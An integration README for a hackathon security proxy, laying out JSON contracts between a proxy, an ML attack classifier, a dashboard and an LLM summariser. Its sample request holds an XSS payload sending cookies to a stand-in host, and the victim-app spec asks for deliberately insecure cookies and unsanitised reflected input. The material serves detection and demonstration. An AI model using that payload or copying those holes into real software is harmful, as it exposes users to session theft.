# Integration README — who talks to whom, and in what shape

Read this before you write a single line of code. This is the contract that lets all 4 people build in parallel without stepping on each other. **If you change a shape defined here, you must message the team before you do it** — everyone else is coding against this as if it's fixed.

---

## Module ownership

| Module | Folder | Owner | Deploys to |
|---|---|---|---|
| Proxy | `proxy/` | Part 1 | Vercel (`shield-proxy.vercel.app`) |
| ML Detection Engine | `ml-service/` | Part 2 | Render/Railway/HF Spaces |
| Dashboard + Control Plane + DB schema | `dashboard/` | Part 3 | Vercel (`shield-dash.vercel.app`) |
| LLM Agent + Victim App + Training | `llm-agent/`, `victim-app/` | Part 4 | Vercel (`victim-shop.vercel.app` + agent routes) |

---

## Boundary 1 — Proxy → ML Service

**Who calls whom:** Proxy (Part 1) calls ML Service (Part 2) over HTTP, async (fire-and-forget from the visitor's point of view — never block the response on this call).

**Endpoint:** `POST {ML_SERVICE_URL}/classify`

**Request body (Part 1 sends this):**
```json
{
  "request": {
    "method": "GET",
    "path": "/comment?q=<script>fetch('//evil.vercel.app?c='+document.cookie)</script>",
    "query": "q=<script>...",
    "headers": { "user-agent": "...", "referer": "..." },
    "ip": "203.0.113.4"
  },
  "response_meta": {
    "status_code": 200,
    "set_cookie_flags": { "httponly": false, "secure": true, "samesite": "lax" },
    "content_length": 1821
  },
  "session_features": {
    "session_token_hash": "sha256-prefix-only",
    "ip_change_count_5min": 2,
    "ua_change_count_5min": 1,
    "asn_changed": true
  }
}
```
**Never send raw cookie values, raw tokens, or passwords — hashes/flags only. This is a stated design rule, not optional.**

**Response body (Part 2 returns this):**
```json
{
  "attack_detected": true,
  "attack_class": "xss",
  "confidence": 0.93,
  "risk_score": 3,
  "action_recommended": "temp_block"
}
```
`attack_class` is one of: `xss | sqli | php_rce | scanner | cred_stuffing | session_replay | benign`.
`action_recommended` is one of: `log | alert | rate_limit | challenge | temp_block`.

**Mocking strategy while building:** Part 1 hardcodes a stub function that returns the shape above based on a simple keyword check (`<script>`, `UNION SELECT`, etc.) until Part 2's real service is live. Part 2 tests purely with Postman/curl against the spec above — never needs the proxy running.

---

## Boundary 2 — Proxy → Supabase (`events` table)

Proxy writes one row per request, **async, after the response is already sent to the visitor.**

```json
{
  "origin_id": "uuid-of-the-registered-origin",
  "method": "GET",
  "path": "/comment",
  "ip": "203.0.113.4",
  "user_agent": "...",
  "status_code": 200,
  "rule_hit": null,
  "features": { "...": "whatever was sent to ML" },
  "ml_attack_class": "xss",
  "ml_confidence": 0.93,
  "ml_risk_score": 3
}
```
If `ml_confidence >= policy.auto_block_threshold`, the proxy also writes a `findings` row and an `incidents` row (see schema in `01_ARCHITECTURE.md` §5).

**Mocking strategy:** Part 1 can `console.log()` this payload and skip the real Supabase write until Part 3 has shared the project URL/keys. Use a local `.env.local` flag `WRITE_TO_SUPABASE=false` during solo dev.

---

## Boundary 3 — Dashboard ← Supabase (Realtime)

Part 3 subscribes to `events`, `findings`, `incidents` via Supabase Realtime channels. This needs **zero coordination with Part 1 or Part 2** — Part 3 tests entirely against seed data inserted directly via SQL:

```sql
insert into findings (origin_id, severity, category, title, status)
values ('<any-uuid>', 'high', 'xss', 'Reflected script in comment field', 'open');
```
If that row shows up live on the dashboard without a page refresh, the module passes, independent of everything else.

---

## Boundary 4 — Dashboard Control-Plane API → Policies

Part 1's proxy reads `policies` directly from Supabase (read-only) to know its thresholds and mode (`shadow` vs `enforce`). Part 3 exposes an API route to edit a policy:

`PATCH /api/policies/{origin_id}` body: `{ "auto_block_threshold": 0.9, "mode": "enforce" }`

**Mocking strategy:** Part 1 hardcodes `{ auto_block_threshold: 0.9, alert_threshold: 0.6, mode: 'shadow' }` locally until Supabase is wired.

---

## Boundary 5 — LLM Agent ← `findings` table

Part 4's agent needs to turn a new `findings` row into a plain-English `ai_summary`. Two acceptable trigger strategies — **pick the simpler one for the hackathon**: a Supabase **database webhook** (fires on insert) calling the agent's API route, or a **polling loop** (every 5–10s, `select * from findings where ai_summary is null`). Polling is fine and far less fragile under hackathon time pressure.

**Agent input (mock this while Part 3's schema isn't live yet):**
```json
{
  "id": "finding-uuid",
  "severity": "high",
  "category": "xss",
  "title": "Reflected script in comment field",
  "evidence": { "payload": "<script>...</script>", "path": "/comment" }
}
```

**Agent output — written back to `findings.ai_summary`:**
```json
{ "ai_summary": "An attacker injected a script into the comment field that silently sent visitor cookies to an external domain. This is a stored cross-site scripting attack. We recommend sanitizing user input on this field and rotating any session cookies that were active during the attack window." }
```

**LLM call order:** try OpenRouter first → on error/timeout (>4s) fall back to Groq. NVIDIA NIM is optional/stretch — wire it only if time allows, as a second fallback or for an embeddings-based payload-similarity feature.

**Mocking strategy:** Part 4 tests the agent with a hardcoded finding JSON (above) and confirms it gets a sensible English paragraph back — no dependency on the proxy, ML service, or live Supabase rows.

---

## Boundary 6 — Proxy → Victim App (origin)

Part 1's proxy just needs **any** URL to forward to. Part 4's victim app must be reachable standalone at its own `*.vercel.app` URL before the proxy ever touches it — Part 1 can develop against `https://httpbin.org` or any public URL as a stand-in origin until Part 4's app is deployed.

**Contract:** the victim app has no special API — it's a normal Next.js app. The only two things it must do for the demo to work:
1. Set a session cookie **without** `HttpOnly`/`Secure` on login (the deliberate weakness).
2. Reflect/store a user-supplied string somewhere without sanitizing it (the deliberate XSS).

---

## Final integration checklist (run through this in order)

- [ ] Part 3 shares `NEXT_PUBLIC_SUPABASE_URL` / keys with the team; everyone updates `.env.local`
- [ ] Part 2 shares the deployed `ML_SERVICE_URL`; Part 1 swaps the mock classifier for the real call
- [ ] Part 1 swaps `console.log` for a real Supabase insert using the shared keys
- [ ] Part 4 deploys the victim app; Part 1 registers it as a real origin via the dashboard UI
- [ ] Part 4's agent is pointed at the real `findings` table instead of the mock JSON
- [ ] Run the full demo flow from `01_ARCHITECTURE.md` §1, end to end, twice
- [ ] Confirm fail-open: kill the ML service mid-demo, confirm the proxy still enforces rule-based blocks and the dashboard still updates (minus the ML-derived fields)
